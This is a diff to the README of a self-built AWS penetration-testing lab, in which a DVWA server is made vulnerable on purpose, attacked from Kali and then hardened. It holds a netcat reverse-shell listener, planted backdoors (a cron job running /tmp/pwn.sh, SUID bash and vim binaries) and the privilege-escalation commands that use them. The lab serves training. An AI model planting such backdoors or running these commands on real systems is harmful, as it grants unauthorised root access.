@@ -1,6 +1,5 @@
 # AWS-Penetration-Testing-Lab
 Create a vulnerable cloud environment on AWS, simulate attacks using Kali Linux tools, identify security flaws, then harden and secure the environment using AWS-native services.
-![Pentest-lab](https://github.com/user-attachments/assets/7d1bc252-44ac-433d-a33b-912193541ebb)
 
 ## 🎯 Lab Objectives
 
@@ -36,12 +35,18 @@ Create a vulnerable cloud environment on AWS, simulate attacks using Kali Linux 
 
 ## 📱 Network Architecture
 
+
+
 | Component         | CIDR / Info         | Purpose                     |
 |------------------|---------------------|-----------------------------|
 | VPC              | 10.0.0.0/16         | Isolated Pentest Lab        |
 | Attacker-subnet  | 10.0.1.0/24         | Kali Linux Attacker         |
 | Target-subnet    | 10.0.2.0/24         | DVWA Vulnerable App         |
 | Private-subnet   | 10.0.3.0/24         | Internal Hardened Server    |
+
+### 🖼️ Visual Network Architecture
+
+![Pentest-lab](https://github.com/user-attachments/assets/7d1bc252-44ac-433d-a33b-912193541ebb)
 
 ## 🌐 Routing
 
@@ -113,9 +118,11 @@ nano /var/www/html/dvwa/config/config.inc.php
 # Set:
 $_DVWA[ 'db_user' ] = 'dvwa';
 $_DVWA[ 'db_password' ] = 'password';
+$_DVWA[ 'db_server' ] = '<Internal Server private IP>';
 
 sudo systemctl restart apache2
 ```
+> 💡 The internal MySQL server at `<Internal Server private IP>` acts as the backend for the DVWA application hosted on the DVWA-Server. This simulates a common real-world scenario where the app and database are isolated across subnets.
 
 ## 🛠️ Internal Server Configuration
 
@@ -220,6 +227,7 @@ sudo chmod 4755 /usr/local/bin/vimroot
 | Cronjob Backdoor   | `/tmp/pwn.sh` via `/etc/crontab` | Scheduled root shell |
 | SUID Vim           | `/usr/local/bin/vimroot`     | `:!/bin/bash` in Vim   |
 
+> 🧠 These vulnerabilities were **intentionally added to the DVWA server** to simulate CTF-style privilege escalation paths.
 
 ## 🧰 Tools Used
 - **Kali Linux** – Offensive security tools and attack platform
@@ -256,11 +264,19 @@ nc -lvnp 4444
 - Reverse shell as `www-data`
 
 ### 🛠️ Step 4: Privilege Escalation on DVWA
-- Exploited SUID binary `/usr/local/bin/rootme`:
 ```bash
+# Exploiting SUID Bash
 /usr/local/bin/rootme -p
 bash -p
-whoami  # root
+whoami
+
+# Wait for cronjob
+sleep 60
+ls -l /bin/bash  # Look for SUID bit
+bash -p
+
+# Exploiting SUID Vim
+vimroot -c ':!/bin/bash'
 ```
 
 ### 🔁 Step 5: Internal Network Scanning from DVWA
@@ -272,6 +288,8 @@ nmap -sS -sV -T4 10.0.3.129
   - 22, 2222 → Cowrie honeypot
   - 22222 → Real SSH
   - 3306 → MySQL
+
+> ✅ With root access on DVWA and confirmed access to internal services, the next stage is **pivoting** into the private subnet using SSH tunneling or SOCKS proxying.
 
 ## 📢 Notes
 
